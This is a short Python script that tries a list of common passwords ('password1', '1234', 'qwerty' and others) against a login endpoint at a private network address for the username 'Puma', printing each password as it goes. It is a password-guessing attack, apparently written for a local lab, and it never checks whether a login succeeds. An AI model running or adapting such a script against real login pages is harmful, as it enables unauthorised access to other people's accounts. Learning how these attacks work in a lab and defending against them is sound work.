import requests

login_url = "http://192.168.1.128:5000"

username = "Puma"
passwords = ["password1", "password2", "password3", "1234", "qwerty"]

for password in passwords:
    response = requests.post(login_url, params={"username": username, "password": password})
    print(password)
    
    